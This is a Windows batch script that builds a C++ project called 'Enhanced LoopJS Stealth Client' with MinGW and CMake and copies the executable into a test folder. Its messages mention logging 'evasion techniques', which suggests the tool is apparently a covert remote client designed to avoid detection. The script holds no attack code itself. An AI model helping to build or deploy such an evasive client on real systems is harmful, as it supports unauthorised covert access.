@echo off
echo Building Enhanced LoopJS Stealth Client with Debug Output...

REM Set environment
set MINGW_DIR=C:\Qt\Tools\mingw1310_64
set CMAKE_DIR=C:\Qt\Tools\CMake_64
set PATH=%MINGW_DIR%\bin;%CMAKE_DIR%\bin;%PATH%

REM Clean previous build
if exist build rmdir /s /q build

REM Create build directory
mkdir build
cd build

REM Configure with CMake (force debug output even in release)
cmake .. -G "MinGW Makefiles" -DCMAKE_C_COMPILER="%MINGW_DIR%\bin\gcc.exe" -DCMAKE_CXX_COMPILER="%MINGW_DIR%\bin\g++.exe" -DCMAKE_BUILD_TYPE=Release -DFORCE_DEBUG_OUTPUT=ON

REM Build the project
cmake --build . --config Release

REM Check if build was successful
if exist bin\StealthClient.exe (
    echo.
    echo ==========================================
    echo BUILD SUCCESSFUL!
    echo ==========================================
    echo Executable: %CD%\bin\StealthClient.exe
    
    REM Get file size
    for %%A in (bin\StealthClient.exe) do echo Size: %%~zA bytes
    
    REM Copy to test directory
    if not exist ..\..\test-clients\stealth-client mkdir ..\..\test-clients\stealth-client
    copy bin\StealthClient.exe ..\..\test-clients\stealth-client\
    echo Copied to test-clients\stealth-client\
    
    echo.
    echo Debug output is ENABLED for testing phase
    echo All evasion techniques will show detailed logs
    echo.
) else (
    echo.
    echo ==========================================
    echo BUILD FAILED!
    echo ==========================================
    echo Check the error messages above
    echo.
)

pause
